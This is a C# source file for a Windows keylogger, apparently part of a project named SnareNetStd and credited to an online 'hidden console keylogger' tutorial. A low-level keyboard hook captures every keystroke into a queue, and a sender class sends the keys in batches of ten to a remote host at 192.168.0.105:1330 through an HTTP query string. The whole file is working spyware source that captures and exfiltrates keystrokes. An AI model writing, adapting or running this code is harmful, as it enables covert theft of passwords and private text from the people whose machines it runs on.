using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Collections.Concurrent;
using System.Net;

/// <summary>
/// Originally inspired from:
/// https://null-byte.wonderhowto.com/how-to/create-simple-hidden-console-keylogger-c-sharp-0132757/
/// </summary>
namespace SnareNetStd
{
    class KeylogTask
    {
        private volatile bool _KeepGoing;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public bool KeepGoing
        {
            get { return _KeepGoing; }
            set { _KeepGoing = value; }
        }

        public void KeyLogger()
        {
            Console.WriteLine("Logging Keys");
            while (_KeepGoing)
            {
                
                _hookID = SetHook(_proc);
                Application.Run();
                UnhookWindowsHookEx(_hookID);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        // A bunch of low level guff...

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);
                Keys key = (Keys)vkCode;
                KeyLogQueue.keyLogQueue.putKeyOnQueue(key.ToString());
                
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // Low level guff over.


    }

    public class SendKeyLogTask
    {
        public void sendKeyLogTask()
        {
            Console.WriteLine("sendkeys");
            while (true)
            {
                if (KeyLogQueue.keyLogQueue.getQueueLength() > 10)
                {
                    Console.WriteLine(KeyLogQueue.keyLogQueue.getQueueLength());
                    string keys = String.Empty;
                    int i = 0;
                    while (i < 10)
                    {
                        keys += KeyLogQueue.keyLogQueue.getKeyFromQueue();
                        i++;
                    }
                    Console.WriteLine(keys);

                    using (var client = new WebClient())
                    {
                        var response = client.DownloadString("http://192.168.0.105:1330/?string=" + keys);
                        
                    }
                }
            }   
        }
    }

    public sealed class KeyLogQueue
    {
        //Copying the approach from the Config class.
        private static Lazy<KeyLogQueue> lazy = new Lazy<KeyLogQueue>(() => new KeyLogQueue());

        public static KeyLogQueue keyLogQueue {  get { return lazy.Value; } }

        private ConcurrentQueue<string> keyQueue = new ConcurrentQueue<string>();

        public void putKeyOnQueue(string key)
        {
            keyQueue.Enqueue(key);
        }

        public string getKeyFromQueue()
        {
            keyQueue.TryDequeue(out string key);
            return key;
        }

        public int getQueueLength()
        {
            return keyQueue.Count();
        }

        private KeyLogQueue()
        {
        }


    }
}
